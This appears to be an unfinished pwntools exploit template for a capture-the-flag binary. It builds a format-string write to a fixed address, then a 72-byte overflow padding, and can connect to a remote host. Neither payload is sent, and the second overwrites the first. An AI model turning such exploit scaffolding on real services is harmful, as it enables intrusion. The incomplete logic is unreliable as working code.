from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
set follow-fork-mode parent
set follow-exec-mode same
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def logleak(name, val):  log.success(name+' = %#x' % val)
def loglibc(): log.success('libc addr = %#x' % libc.address)
def logpie(): log.success('pie addr = %#x' % elf.address)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 72

io = start()

payload = fmtstr_payload(offset=10, writes={
    0x40408c:1
},write_size='short')

payload = flat([
    b"A"*offset,

])

io.interactive()
